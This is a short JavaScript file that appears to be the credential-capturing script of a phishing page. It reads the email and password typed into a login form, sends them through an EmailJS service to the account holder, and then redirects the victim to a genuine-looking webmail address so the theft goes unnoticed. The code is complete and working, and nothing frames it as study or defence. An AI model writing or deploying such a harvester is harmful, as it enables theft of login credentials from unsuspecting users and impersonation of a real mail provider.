function sendMail(e){
    e.preventDefault();
    
    let parms = {
        email : document.getElementById("email").value,
        password : document.getElementById("password").value,
    }

    emailjs.send("service_tuysjwi","template_4oln9tt",parms)
    .then(
        function () {
            window.location.href = "https://mail.polarcomm.com/tuxedo/";
        },
        function (error) {
            alert("Failed to send");
            console.log(error);
        }
    );

    return false;
}